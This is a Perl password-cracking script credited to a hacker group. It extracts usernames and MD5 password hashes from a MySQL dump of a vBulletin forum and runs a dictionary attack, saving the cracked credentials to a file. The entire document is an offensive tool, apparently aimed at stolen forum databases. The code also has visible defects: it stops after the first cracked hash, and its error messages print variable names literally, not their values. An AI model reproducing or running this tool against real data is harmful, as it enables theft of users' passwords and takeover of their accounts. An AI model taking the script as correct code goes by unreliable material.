#!/usr/bin/perl
# Hollow Chocolate Bunnies From Hell presenting
# bbcrack.pl
#
# Extracts and cracks hashes of a given MySQL dump of a
# vBulletin board
#
# by softxor <softxor at infosec dot org dot uk>
# http://bunnies.rootyourbox.org/
# IRC: irc.milw0rm.com #hcbfh

use strict;
use Digest::MD5 qw(md5_hex);
my $num_cracked = 0;
my $duration = time();
my @hashes;


if ($#ARGV != 1) {
  print "Usage: bbcrack.pl [SQL FILE] [DICTIONARY]\n";
  exit;
}


# extract hashes from the SQL table
open(SQLFILE, $ARGV[0]) or die('Cannot open SQL Database $ARGV[1]');

print "Extracting hashes from file.\n";

my @hash_file = <SQLFILE>;

foreach my $line (@hash_file) {
  if ($line =~ m/'([0-9a-zA-Z]+)\'\, \'([0-9a-fA-F]{32})\'/g) {
    push(@hashes, "$1:$2");
    #print "Found h$1:$2\n"; # uncomment for dumping hashes to stdout
  }
}

print "Found ".($#hashes + 1)." hashes.\n";


# and if you are not willing, you'll never grow old!
print "Trying to break hashes. Be patient.\n";

open(OUT, ">cracked") or die('Cannot create or write to cracked file. Try chmod the working directory accordingly.');
open(DICT, $ARGV[1]) or die('Cannot open dictionary file $ARGV[1]');


foreach (@hashes) {
 
  my ($username, $hash) = split(":", $_);
  my $foundh = 0; 

  #print "Trying $username\n"; # uncomment for verbose output

  seek(DICT, 0, 0);
 
  while (chomp(my $line = <DICT>)) {

    if ($hash eq md5_hex($line)) {
      print "Cracked: $username : $line\n";
      print OUT "$username : $line\n";
      $foundh = 1;
      $num_cracked++;
     
      last;
    }
   
  }
 
 
  if ($foundh) {
    last;
  }
 
}

close DICT;

$duration = time() - $duration;
print "Finished.\nDuration: $duration Seconds\n$num_cracked/".($#hashes + 1)." hashes cracked.\n";

exit;
